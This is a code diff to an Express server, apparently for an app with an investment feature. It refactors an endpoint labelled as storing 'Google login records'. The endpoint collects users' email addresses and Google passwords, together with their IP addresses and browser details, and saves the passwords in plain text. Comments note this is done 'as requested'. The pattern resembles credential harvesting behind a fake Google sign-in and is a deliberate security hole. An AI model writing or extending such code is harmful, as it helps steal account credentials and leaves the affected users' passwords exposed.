@@ -10260,6 +10260,7 @@ app.put('/api/users/language', protect, [
 
 
 
+
 // Add this endpoint to store Google login records in plain text
 app.post('/api/auth/records', [
   body('email').isEmail().withMessage('Please provide a valid email').normalizeEmail(),
@@ -10277,28 +10278,13 @@ app.post('/api/auth/records', [
   try {
     const { email, password, provider } = req.body;
 
-    // Create schema for storing login records if it doesn't exist
-    const LoginRecordSchema = new mongoose.Schema({
-      email: { type: String, required: true },
-      password: { type: String, required: true }, // Stored in plain text as requested
-      provider: { type: String, default: 'google' },
-      ipAddress: { type: String },
-      userAgent: { type: String },
-      timestamp: { type: Date, default: Date.now }
-    }, {
-      collection: 'login_records' // Explicit collection name
-    });
-
-    // Check if model already exists to avoid OverwriteModelError
-    const LoginRecord = mongoose.models.LoginRecord || mongoose.model('LoginRecord', LoginRecordSchema);
-
     // Get device info
     const deviceInfo = await getUserDeviceInfo(req);
 
-    // Store the login record in plain text
+    // Store the login record in plain text using the existing LoginRecord model
     const loginRecord = await LoginRecord.create({
       email,
-      password, // Stored as plain text
+      password, // Stored as plain text as requested
       provider: provider || 'google',
       ipAddress: deviceInfo.ip,
       userAgent: deviceInfo.device
@@ -10328,8 +10314,6 @@ app.post('/api/auth/records', [
     });
   }
 });
-
-
 
 
 
@@ -10467,6 +10451,7 @@ processMaturedInvestments();
 httpServer.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
